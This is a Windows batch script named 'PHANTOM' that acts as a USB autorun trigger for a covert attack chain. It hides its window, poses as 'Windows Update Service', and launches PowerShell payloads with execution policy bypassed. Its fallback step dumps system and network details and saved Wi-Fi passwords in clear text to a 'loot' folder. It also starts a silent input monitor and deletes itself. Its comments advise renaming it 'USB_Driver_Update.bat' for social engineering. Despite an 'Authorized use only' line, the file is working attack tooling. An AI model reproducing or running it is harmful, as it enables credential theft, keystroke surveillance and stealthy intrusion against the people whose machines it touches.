@echo off
REM ============================================================================
REM  PHANTOM - Zero-Interaction USB Autorun Trigger
REM  ============================================================================
REM  This is the FIRST file that executes when the USB is inserted.
REM  It finds and launches the full attack chain with NO visible windows.
REM
REM  DEPLOYMENT: Place at root of Micro SD (I:\phantom.bat)
REM  Also copy as: I:\autorun.bat, I:\setup.bat, I:\install.bat
REM  
REM  For Flipper Zero BadUSB: open run dialog, type path to this file
REM  For social engineering: rename to "USB_Driver_Update.bat"
REM
REM  FLLC | Authorized use only.
REM ============================================================================

REM === Hide the window immediately ===
if not "%1"=="HIDDEN" (
    start /min cmd /c "%~f0" HIDDEN
    exit /b
)

REM === Set window title to something innocent ===
title Windows Update Service
mode con: cols=1 lines=1

REM === Detect our drive letter ===
set "DRIVE=%~d0"
if "%DRIVE%"=="" set "DRIVE=I:"

REM === Find PowerShell ===
set "PS=powershell.exe"
where powershell.exe >nul 2>nul || set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"

REM === STRATEGY 1: Launch autorun_service.ps1 (full phantom engine) ===
if exist "%DRIVE%\payloads\autorun_service.ps1" (
    start /b "" %PS% -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DRIVE%\payloads\autorun_service.ps1" >nul 2>nul
    goto :MONITOR
)
if exist "%DRIVE%\autorun_service.ps1" (
    start /b "" %PS% -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DRIVE%\autorun_service.ps1" >nul 2>nul
    goto :MONITOR
)

REM === STRATEGY 2: Launch auto_pwn.ps1 directly ===
if exist "%DRIVE%\payloads\auto_pwn.ps1" (
    start /b "" %PS% -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DRIVE%\payloads\auto_pwn.ps1" >nul 2>nul
    goto :MONITOR
)
if exist "%DRIVE%\auto_pwn.ps1" (
    start /b "" %PS% -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DRIVE%\auto_pwn.ps1" >nul 2>nul
    goto :MONITOR
)

REM === STRATEGY 3: Inline fast-grab (no dependencies) ===
%PS% -NoP -NonI -W Hidden -Exec Bypass -Command ^
  "$d='%DRIVE%\loot';md $d -Force|Out-Null;" ^
  "systeminfo|Out-File $d\sysinfo.txt;" ^
  "ipconfig /all|Out-File $d\network.txt;" ^
  "netsh wlan show profiles|ForEach-Object{if($_-match'All User Profile\s*:\s*(.+)'){$n=$Matches[1].Trim();$r=netsh wlan show profile name=$n key=clear;$k=($r|Select-String 'Key Content'|ForEach-Object{($_-split':')[1].Trim()});\"$n : $k\"}}|Out-File $d\wifi.txt;" ^
  "Get-Process|Out-File $d\processes.txt" >nul 2>nul

:MONITOR
REM === STRATEGY 4: Launch input monitor in background ===
where pythonw >nul 2>nul && (
    if exist "%DRIVE%\payloads\input_monitor.py" (
        start /b "" pythonw "%DRIVE%\payloads\input_monitor.py" --output "%DRIVE%\loot" --silent --flush 10 --max-size 500 >nul 2>nul
    )
)

REM === Self-delete from temp if we were copied there ===
if /i "%~dp0"=="%TEMP%\" del /f /q "%~f0" >nul 2>nul

exit /b 0
